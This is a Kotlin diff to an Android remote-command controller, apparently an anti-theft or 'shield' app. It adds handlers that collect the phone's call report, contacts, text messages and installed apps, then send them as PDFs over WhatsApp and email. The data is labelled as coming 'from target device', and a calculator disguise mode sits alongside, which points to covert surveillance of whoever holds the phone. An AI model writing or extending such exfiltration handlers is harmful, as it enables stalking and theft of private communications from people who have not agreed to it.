@@ -98,6 +98,39 @@ class ShieldController(private val context: Context) {
             "CALCULATOR_MODE" -> {
                 context.startActivity(Intent(context, CalculatorActivity::class.java).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) })
             }
+            
+            "CALLS" -> {
+                val intel = IntelligenceEngine(context)
+                val report = intel.generateFullReport()
+                val pdf = pdfReport.generateTheftReport(capturedPhotos, null, "Intelligence Report", report)
+                pdfReport.shareToWhatsApp(pdf, "📊 Full Intelligence Report")
+                email.sendAlert(emergencyEmail, "📊 Intelligence Report", report)
+                Toast.makeText(context, "📊 Full report sent via WhatsApp + Email", Toast.LENGTH_LONG).show()
+            }
+            
+            "CONTACTS" -> {
+                val intel = IntelligenceEngine(context)
+                val contacts = intel.getContacts()
+                val pdf = pdfReport.generateTheftReport(capturedPhotos, null, "Contacts", contacts)
+                pdfReport.shareToWhatsApp(pdf, "👥 Contact list from target device")
+                Toast.makeText(context, "👥 Contacts sent", Toast.LENGTH_SHORT).show()
+            }
+            
+            "MESSAGES" -> {
+                val intel = IntelligenceEngine(context)
+                val messages = intel.getMessages()
+                val pdf = pdfReport.generateTheftReport(capturedPhotos, null, "Messages", messages)
+                pdfReport.shareToWhatsApp(pdf, "💬 Messages from target device")
+                Toast.makeText(context, "💬 Messages sent", Toast.LENGTH_SHORT).show()
+            }
+            
+            "APPS" -> {
+                val intel = IntelligenceEngine(context)
+                val apps = intel.getInstalledApps()
+                val pdf = pdfReport.generateTheftReport(capturedPhotos, null, "Installed Apps", apps)
+                pdfReport.shareToWhatsApp(pdf, "📱 Installed apps report")
+                Toast.makeText(context, "📱 App list sent", Toast.LENGTH_SHORT).show()
+            }
             "DATA_WIPE" -> {
                 capturedPhotos.forEach { it.delete() }
                 capturedPhotos.clear()
